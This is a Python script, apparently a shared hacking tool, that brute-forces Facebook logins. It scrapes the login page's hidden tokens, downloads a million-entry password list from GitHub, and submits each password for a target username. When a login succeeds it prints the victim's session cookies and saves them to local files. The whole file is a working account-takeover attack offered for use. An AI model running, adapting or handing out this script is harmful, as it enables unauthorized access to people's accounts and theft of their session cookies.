import os, sys, time, random, requests
from bs4 import BeautifulSoup as bs
from datetime import datetime

url = 'https://n.facebook.com'
xurl = url + '/login.php'

def banner():
    os.system('clear')
    _ = "-" * 44
    ban = f"""
{_}
                        
        
[   Author : Free$tyle                 ]
[   Github : github.com/Kooper77           ]
[ Time now : {datetime.now()}    ]
{_}
"""
    print(ban)

ua = "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36"

def brute_force_login(username, password):
    req = requests.Session()
    req.headers.update({
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en_US',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': "Windows",
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua
    })

    with req.get(url) as response_body:
        inspect = bs(response_body.text, 'html.parser')
        lsd_key = inspect.find('input', {'name': 'lsd'})['value']
        jazoest_key = inspect.find('input', {'name': 'jazoest'})['value']
        m_ts_key = inspect.find('input', {'name': 'm_ts'})['value']
        li_key = inspect.find('input', {'name': 'li'})['value']
        try_number_key = inspect.find('input', {'name': 'try_number'})['value']
        unrecognized_tries_key = inspect.find('input', {'name': 'unrecognized_tries'})['value']
        bi_xrwh_key = inspect.find('input', {'name': 'bi_xrwh'})['value']

        data = {
            'lsd': lsd_key, 'jazoest': jazoest_key,
            'm_ts': m_ts_key, 'li': li_key,
            'try_number': try_number_key,
            'unrecognized_tries': unrecognized_tries_key,
            'bi_xrwh': bi_xrwh_key, 'email': username,
            'pass': password, 'login': "submit"
        }

        response_body2 = req.post(xurl, data=data, allow_redirects=True, timeout=300)
        cookie = str(req.cookies.get_dict())[1:-1].replace("'", "").replace(",", ";").replace(":", "=")

        if 'checkpoint' in cookie:
            print("\033[1;31mAccount terminated by Facebook!\033[0m")
            return None
        elif 'c_user' in cookie:
            print(f'\n   [\033[38;5;83mCOOKIES\033[0m] \033[38;5;208m{cookie}\033[0m\n\n')
            open('cookies.txt', 'a').write(f'[Cookie] - {cookie}\n\n')
            open('cookie.log', 'w').write(cookie)
            # os.system('xdg-open https://facebook.com/josifvai')
            os.system('xdg-open https://github.com/josifkhan')
            return password
        else:
            print("\033[38;5;208mIncorrect details\033[0m")
            return None

def main():
    banner()
    username = input('[✦] Username/Email/Number: ')

    # Usando a wordlist hospedada no GitHub
    wordlist_url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt'

    try:
        wordlist_response = requests.get(wordlist_url)
        if wordlist_response.status_code == 200:
            wordlist_content = wordlist_response.text.splitlines()
            for password in wordlist_content:
                password = password.strip()
                print(f"Trying username: {username} with password: {password}")
                result = brute_force_login(username, password)
                if result:
                    print(f"Password found: {result}")
                    break
        else:
            print("Failed to fetch wordlist.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    main()
